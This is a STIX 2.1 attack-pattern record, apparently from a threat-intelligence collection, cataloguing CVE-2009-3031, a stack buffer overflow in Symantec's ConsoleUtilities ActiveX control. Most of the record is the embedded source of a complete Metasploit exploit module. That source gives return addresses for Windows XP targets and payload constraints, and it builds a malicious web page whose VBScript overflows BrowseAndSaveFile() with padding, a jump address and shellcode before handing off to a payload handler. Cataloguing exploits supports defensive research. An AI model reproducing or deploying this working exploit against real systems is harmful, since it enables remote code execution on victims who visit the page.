{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c11af31c-8346-4fb1-9bcc-d4c4afdf9682",
    "created": "2024-08-14T16:40:26.774863Z",
    "modified": "2024-08-14T16:40:26.774868Z",
    "name": "Symantec ConsoleUtilities ActiveX Control Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in Symantecs ConsoleUtilities. By sending an overly long string to the \"BrowseAndSaveFile()\" method located in the AeXNSConsoleUtilities.dll (6.0.0.1846) Control, an attacker may be able to execute arbitrary code  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/symantec_consoleutilities_browseandsavefile.rb",
            "external_id": "symantec_consoleutilities_browseandsavefile.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-3031"
        },
        {
            "source_name": "reference",
            "url": "http://sotiriu.de/adv/NSOADV-2009-001.txt"
        },
        {
            "source_name": "reference",
            "url": "http://www.symantec.com/business/security_response/securityupdates/detail.jsp?fid=security_advisory&pvid=security_advisory&year=2009&suid=20091102_00"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Symantec ConsoleUtilities ActiveX Control Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in Symantecs ConsoleUtilities.\n        By sending an overly long string to the \"BrowseAndSaveFile()\" method located\n        in the AeXNSConsoleUtilities.dll (6.0.0.1846) Control, an attacker may be able to\n        execute arbitrary code\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'Nikolas Sotiriu (lofi)' ],\n      'References'     =>\n        [\n          [ 'CVE', '2009-3031'],\n          [ 'OSVDB', '59597'],\n          [ 'BID', '36698'],\n          [ 'URL', 'http://sotiriu.de/adv/NSOADV-2009-001.txt' ],\n          [ 'URL', 'http://www.symantec.com/business/security_response/securityupdates/detail.jsp?fid=security_advisory&pvid=security_advisory&year=2009&suid=20091102_00' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'         => 1000,\n          'BadChars'      => \"\\x00\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows XP SP3 English', \t    { 'Ret' => 0x7e47bcaf } ],\n          [ 'Windows XP SP2 Universal',\t    { 'Ret' => 0x77d92acc } ], # USER32.dll JMP ESP\n          [ 'Windows XP SP2 Pro German',      { 'Ret' => 0x77D5AF0A } ], # SHELL32.dll JMP ESP\n          [ 'Windows XP SP3 Pro German',      { 'Ret' => 0x7E6830D7 } ], # SHELL32.dll JMP ESP\n        ],\n      'DisclosureDate' => '2009-11-02',\n      'DefaultTarget'  => 0))\n  end\n\n  def autofilter\n    false\n  end\n\n  def check_dependencies\n    use_zlib\n  end\n\n  def on_request_uri(cli, request)\n    # Re-generate the payload\n    return if ((p = regenerate_payload(cli)) == nil)\n\n    # Randomize variables\n    vname   = rand_text_alpha(rand(20) + 1)\n    junk    = rand_text_alpha(rand(20) + 1)\n    eip     = rand_text_alpha(rand(20) + 1)\n    morejunk = rand_text_alpha(rand(20) + 1)\n    sc      = rand_text_alpha(rand(20) + 1)\n    buf = rand_text_alpha(rand(20) + 1)\n\n    # Set RET and shellcode\n    ret = Rex::Text.to_unescape([target.ret].pack('V'))\n    shellcode = Rex::Text.to_unescape(p.encoded)\n\n    # Build the Site\n    content = %Q|\n  <html>\n    <object classid='clsid:B44D252D-98FC-4D5C-948C-BE868392A004' id='#{vname}'></object>\n    <script language='vbscript'>\n\n    #{junk}=String(310,\"A\")\n    #{eip}=unescape(\"#{ret}\")\n    #{morejunk}=String(18, unescape(\"%u0041\"))\n    #{sc}=unescape(\"#{shellcode}\")\n\n    #{buf}=#{junk}+#{eip}+#{morejunk}+#{sc}\n    #{vname}.BrowseAndSaveFile \"\",#{buf},\"\",\"\",\"\"\n    </script>\n  </html>\n    |\n\n    print_status(\"Sending #{self.name}\")\n\n    # Transmit the response to the client\n    send_response_html(cli, content)\n\n    # Handle the payload\n    handler(cli)\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-11-02",
    "x_mitre_platforms": [
        "win'"
    ]
}